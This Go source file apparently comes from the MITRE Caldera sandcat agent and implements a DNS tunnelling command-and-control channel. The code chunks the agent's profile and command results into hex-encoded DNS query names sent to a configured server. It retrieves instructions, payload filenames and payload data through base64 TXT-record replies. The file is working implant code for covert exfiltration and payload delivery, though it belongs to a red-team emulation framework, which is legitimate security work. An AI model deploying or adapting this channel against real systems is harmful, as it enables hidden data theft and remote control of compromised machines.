package contact

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"net"
	"strconv"
	"time"

	"github.com/mitre/gocat/output"
	"github.com/miekg/dns"
)

const (
	RECORD_TYPE_A = 1
	RECORD_TYPE_TXT = 16
	TIMEOUT_SECONDS = 10
	BASE_DOMAIN = "mycaldera.caldera"
	MIN_MESSAGE_ID = 10000000
	MAX_MESSAGE_ID = 99999999
	MAX_UPLOAD_CHUNK_SIZE = 31 // DNS label is 63 characters max, so 31 bytes in hex reaches 62 characters.

	BEACON_UPLOAD_TYPE = "be"
	INSTRUCTION_DOWNLOAD_TYPE = "id"
	PAYLOAD_REQUEST_TYPE = "pr"
	PAYLOAD_FILENAME_DOWNLOAD_TYPE = "pf"
	PAYLOAD_DATA_DOWNLOAD_TYPE = "pd"
)

type DnsTunneling struct {
	name string
	resolver *net.Resolver
	resolverContext context.Context
}

func init() {
	CommunicationChannels["DnsTunneling"] = &DnsTunneling{
		name: "DnsTunneling",
		resolverContext: context.Background(),
	}
}

//GetInstructions sends a beacon and returns instructions
func (d* DnsTunneling) GetBeaconBytes(profile map[string]interface{}) []byte {
	server := profile["server"].(string)
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot request beacon. Error with profile marshal: %s", err.Error()))
		return nil
	}

	// Chunk out the beacon message
	beaconID, err := d.tunnelBytesToServer(server, BEACON_UPLOAD_TYPE, data)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error tunneling beacon: %s", err.Error()))
		return nil
	}

	// Fetch beacon response
	beaconResponse, err := d.fetchServerResponseViaTxt(server, beaconID, INSTRUCTION_DOWNLOAD_TYPE)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error fetching beacon response: %s", err.Error()))
		return nil
	}
	return beaconResponse
}

//GetPayloadBytes fetch payload bytes from server
func (d* DnsTunneling) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
    var filename string

    server := profile["server"].(string)
    platform := profile["platform"]
    paw := profile["paw"]
    if server != "" && platform != nil && paw != nil {
    	payloadMetadata := map[string]string{
    		"file": payloadName,
    		"server": server,
    		"platform": platform.(string),
    		"paw": paw.(string),
    	}
    	data, err := json.Marshal(payloadMetadata)
    	if err != nil {
    		output.VerbosePrint(fmt.Sprintf("[!] Error marshalling payload metadata: %s", err.Error()))
    		return nil, ""
    	}

		// Let server know we want to download a payload
		messageID, err := d.tunnelBytesToServer(server, PAYLOAD_REQUEST_TYPE, data)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[!] Error requesting payload from server: %s", err.Error()))
			return nil, ""
		}

		// Fetch payload filename
		filename, err = d.fetchPayloadName(server, messageID)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[!] Error fetching payload name from server: %s", err.Error()))
			return nil, ""
		}

		// Fetch payload data
		payloadBytes, err = d.fetchPayloadData(server, messageID)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[!] Error fetching payload data from server: %s", err.Error()))
			return nil, ""
		}
    }
	return payloadBytes, filename
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (d* DnsTunneling) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    if d.resolver == nil {
    	server := profile["server"].(string)
    	if len(server) == 0 {
    		output.VerbosePrint("[!] No server established for DNS Tunneling.")
    		return false, nil
    	}
		d.resolver = &net.Resolver {
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				dialer := net.Dialer{
					Timeout: time.Second * time.Duration(TIMEOUT_SECONDS),
				}
				return dialer.DialContext(ctx, network, server)
			},
		}
    }
    return true, nil
}

//SendExecutionResults send results to the server
func (d* DnsTunneling) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	data, err := json.Marshal(profileCopy)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot send execution results. Error with profile/result marshal: %s", err.Error()))
		return
	}
	if _, err = d.tunnelBytesToServer(profile["server"].(string), BEACON_UPLOAD_TYPE, data); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to send execution results: %s", err.Error()))
	}
}

func (d* DnsTunneling) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	return errors.New("Not yet implemented.")
}

func (d* DnsTunneling) GetName() string {
	return d.name
}

func (d *DnsTunneling) fetchPayloadName(server, messageID string) (string, error) {
	payloadNameBytes, err := d.fetchServerResponseViaTxt(server, messageID, PAYLOAD_FILENAME_DOWNLOAD_TYPE)
	if err != nil {
		return "", nil
	}
	return string(payloadNameBytes), nil
}

func (d *DnsTunneling) fetchPayloadData(server, messageID string) ([]byte, error) {
	return d.fetchServerResponseViaTxt(server, messageID, PAYLOAD_DATA_DOWNLOAD_TYPE)
}

// Returns message ID and no error upon success.
func (d* DnsTunneling) tunnelBytesToServer(server string, dataType string, data []byte) (string, error) {
	messageID := generateRandomMessageID()

	// Chunk out data
	dataSize := len(data)
	numChunks := int(math.Ceil(float64(dataSize) / float64(MAX_UPLOAD_CHUNK_SIZE)))
	start := 0
	finalChunk := false
	for i := 0; i < numChunks; i++ {
		end := start + MAX_UPLOAD_CHUNK_SIZE
		if end > dataSize {
			end = dataSize
		}
		if (i == numChunks - 1) {
			finalChunk = true
		}
		chunk := data[start:end]
		qname, err := generateQname(messageID, dataType, i, numChunks, chunk)
		if err != nil {
			return "", err
		}
		if err = d.sendDataChunk(server, qname, finalChunk); err != nil {
			return "", err
		}
		start += MAX_UPLOAD_CHUNK_SIZE
	}
	return messageID, nil
}

// If data chunk is the final chunk and server does not respond with completion, returns error.
func (d *DnsTunneling) sendDataChunk(server string, qname string, finalChunk bool) error {
	ipAddr, err := d.fetchARecord(server, qname)
	if err != nil {
		return err
	}
	// Check parity of final IP addr octet
	ipVal, err := ipv4ToUint32(ipAddr)
	if err != nil {
		return err
	}
	if (ipVal % 2 == 0 && finalChunk) || (ipVal % 2 != 0 && !finalChunk) {
		return errors.New("Server did not respond properly to the given data chunk.")
	}
	return nil
}

func (d *DnsTunneling) fetchServerResponseViaTxt(server, messageID, messageType string) ([]byte, error) {
	completed := false
	var buffer bytes.Buffer
	for (!completed) {
		randomData := generateRandomData(MAX_UPLOAD_CHUNK_SIZE)
		qname, err := generateQname(messageID, messageType, 0, 1, randomData)
		if err != nil {
			return nil, err
		}
		responses, err := d.fetchTxtRecords(server, qname)
		if err != nil {
			return nil, err
		}
		if len(responses) == 0 || len(responses[0]) == 0 {
			return nil, errors.New("Server failed to send back any data via TXT record.")
		}

		// Expecting only one txt response. Last char of response indicates whether or not there is remaining data.
		chunkLength := len(responses[0]) - 1
		buffer.WriteString(responses[0][:chunkLength])
		finalChar := string(responses[0][chunkLength])
		if finalChar == "." {
			// Still expecting more data from server
			continue
		} else if finalChar == "," {
			completed = true
			output.VerbosePrint("Finished fetching data from server.")
		} else {
			return nil, errors.New(fmt.Sprintf("Server responded with invalid final TXT record character %s", finalChar))
		}
	}
	return base64.StdEncoding.DecodeString(buffer.String())
}

func generateQname(messageID string, messageType string, chunkIndex int, numChunks int, data []byte) (string, error) {
	if len(data) > MAX_UPLOAD_CHUNK_SIZE {
		return "", errors.New("Data chunk too large.")
	}
	dataHex := hex.EncodeToString(data)
	return fmt.Sprintf("%s.%s.%d.%d.%s.%s.", messageID, messageType, chunkIndex, numChunks, dataHex, BASE_DOMAIN), nil
}

func (d* DnsTunneling) fetchTxtRecords(server string, qname string) ([]string, error) {
	msg := new(dns.Msg)
	msg.Id = dns.Id()
	msg.RecursionDesired = true
	msg.Question = make([]dns.Question, 1)
	msg.Question[0] = dns.Question{qname, dns.TypeTXT, dns.ClassINET}
	answer, err := dns.Exchange(msg, server)
	if err != nil {
		return nil, err
	}
	if txtRecordStruct, ok := answer.Answer[0].(*dns.TXT); ok {
		return txtRecordStruct.Txt, nil
	} else {
		return nil, errors.New("Failed to retrieve TXT records.")
	}
}

func (d* DnsTunneling) fetchARecord(server, qname string) (net.IP, error) {
	msg := new(dns.Msg)
	msg.Id = dns.Id()
	msg.RecursionDesired = true
	msg.Question = make([]dns.Question, 1)
	msg.Question[0] = dns.Question{qname, dns.TypeA, dns.ClassINET}
	answer, err := dns.Exchange(msg, server)
	if err != nil {
		return net.IPv4(0, 0, 0, 0), err
	}
	if aRecordStruct, ok := answer.Answer[0].(*dns.A); ok {
		return aRecordStruct.A, nil
	} else {
		return net.IPv4(0, 0, 0, 0), errors.New("Failed to retrieve A record.")
	}
}

// Generate random 8-digit message ID
func generateRandomMessageID() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(MIN_MESSAGE_ID + rand.Intn(MAX_MESSAGE_ID - MIN_MESSAGE_ID))
}

func ipv4ToUint32(ipAddr net.IP) (uint32, error) {
	ipv4 := ipAddr.To4()
	if ipv4 == nil {
		return 0, errors.New("Provided IP was not IPv4")
	}
	return binary.BigEndian.Uint32(ipv4), nil
}

func generateRandomData(length int) []byte {
	buffer := make([]byte, length)
	rand.Read(buffer)
	return buffer
}